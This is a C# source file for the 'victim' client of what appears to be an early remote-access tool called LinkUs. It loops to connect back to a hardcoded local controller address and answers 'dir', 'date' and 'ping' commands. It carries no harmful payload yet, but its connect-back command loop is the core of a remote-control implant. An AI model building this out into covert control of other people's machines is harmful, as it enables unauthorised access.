using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using LinkUs.Core;

namespace LinkUs.Victim
{
    class Program
    {
        private static readonly UTF8Encoding Encoding = new UTF8Encoding();
        private static readonly ManualResetEvent ManualResetEvent = new ManualResetEvent(false);

        static void Main(string[] args)
        {
            while (true) {
                var connection = new SocketConnection();
                if (TryConnectSocketToHost(connection)) {
                    try {
                        var packageTransmitter = new PackageTransmitter(connection);
                        packageTransmitter.PackageReceived += (sender, package) => {
                            ProcessCommand(packageTransmitter, package);
                        };
                        packageTransmitter.Closed += (sender, eventArgs) => {
                            ManualResetEvent.Set();
                        };
                        ManualResetEvent.WaitOne();
                        Thread.Sleep(1000);
                    }
                    catch (Exception ex) {
                        Console.WriteLine(ex);
                    }
                }
                else {
                    Thread.Sleep(1000);
                }
            }
        }

        private static bool TryConnectSocketToHost(IConnection connection)
        {
            string host = "127.0.0.1";
            int port = 9000;

            try {
                Console.Write($"* Try to connect to host {host} on port {port} ... ");
                connection.Connect(host, port);
                Console.WriteLine("[SUCCESS]");
                return true;
            }
            catch (SocketException) {
                Console.WriteLine("[FAILED]");
                return false;
            }
        }

        private static void ProcessCommand(PackageTransmitter transmitter, Package package)
        {
            Console.WriteLine(package);

            var command = Encoding.GetString(package.Content);
            if (command == "dir") {
                Thread.Sleep(1000);
                var packageResponse = package.CreateResponsePackage(Encoding.GetBytes(Directory.GetCurrentDirectory()));
                transmitter.Send(packageResponse);
            }
            else if (command == "date") {
                var packageResponse = package.CreateResponsePackage(Encoding.GetBytes(DateTime.Now.ToShortDateString()));
                transmitter.Send(packageResponse);
            }
            else if (command == "ping") {
                var packageResponse = package.CreateResponsePackage(Encoding.GetBytes("ok"));
                transmitter.Send(packageResponse);
            }
        }
    }
}